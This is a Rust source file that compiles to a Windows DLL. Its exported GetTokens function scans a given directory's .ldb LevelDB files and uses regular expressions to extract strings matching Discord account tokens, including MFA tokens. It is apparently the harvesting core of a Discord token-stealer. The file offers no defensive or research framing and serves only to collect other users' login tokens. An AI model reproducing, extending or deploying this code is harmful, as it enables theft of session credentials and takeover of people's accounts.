#![cfg(windows)]

extern crate regex;
extern crate encoding;

use encoding::{Encoding, DecoderTrap};
use encoding::all::WINDOWS_1254;
use regex::{Regex, RegexBuilder};

use std::io;
use std::fs;
use std::io::prelude::*;
use std::str;
use std::ffi::CString;
use std::ffi::CStr;
use std::os::raw::c_char;


fn path_exists(path: String) -> Result<bool, String> {
    let metadata;
    match fs::metadata(path.as_str()) {
        Ok(t) => metadata = t,
        Err(_) => return Err(format!("Error: Path doesn't exists [{}]", path))
    }
    if metadata.is_file() {
        return Err(format!("Error: Path is a file, not a directory! [{}]", path));
    } else if metadata.is_dir() {
        return Ok(true)
    } else {
        return Err(format!("Error: Unknow error with path [{}]", path))
    }
}

fn get_tokens_file(file: &str) -> io::Result<String> {
    let re_token_normal = Regex::new(r"([\w-]{24})\.([\w-]{6})\.([\w-]{27})").unwrap();
    let re_token_mfa = RegexBuilder::new(r#"mfa\.[\w-]{84}"#)
            .size_limit(20485760)
            .case_insensitive(true)
            .build()
            .unwrap();

    let mut buffer = Vec::new();
    let mut f = fs::File::open(file)?;
    f.read_to_end(&mut buffer)?;

    let data_str: &str;
    let data_string: String;
    match WINDOWS_1254.decode(&buffer, DecoderTrap::Strict) {
        Ok(t) => data_string = t.to_owned(),
        Err(_) => return Ok(String::from(""))
    }
    data_str = &data_string[..];

    let mut tokens: String = String::from("");
    for cap in re_token_normal.captures_iter(data_str) {
        tokens += &cap[0];
        tokens += "\n";
    } for cap in re_token_mfa.captures_iter(data_str) {
        tokens += &cap[0];
        tokens += "\n";
    }

    Ok(tokens)
}

fn return_tokens(path: String) -> Result<String, String> {

    match path_exists(path.clone()) {
        Ok(_) => (),
        Err(e) => return Err(e)
    }

    let mut tokens: String = String::from("");
    let dirs = fs::read_dir(path.clone().as_str()).unwrap();
    for dir in dirs {
        let dir_name = format!("{}", dir.unwrap().path().display());

        if dir_name.ends_with(".ldb") {
            match get_tokens_file(dir_name.as_str()) {
                Ok(t) => tokens += t.as_str(),
                Err(_) => tokens += ""
            }
        }
    }

    tokens.pop();
    Ok(tokens)
}


#[no_mangle]
#[allow(non_snake_case, unused_variables)]
pub extern "C" fn GetTokens(path: *const c_char) -> CString {

    let bytes = unsafe {
        CStr::from_ptr(path).to_bytes()
    };

    let path_str: &str;
    match str::from_utf8(bytes) {
        Ok(t) => path_str = t,
        Err(_) => return CString::new("Error:").unwrap()
    }


    let mut tokens_string: String;
    match return_tokens(String::from(path_str)) {
        Ok(tokens) => return CString::new(tokens.as_str()).unwrap(),
        Err(e) => return CString::new(format!("Error: {}", e).as_str()).unwrap()
    }
}
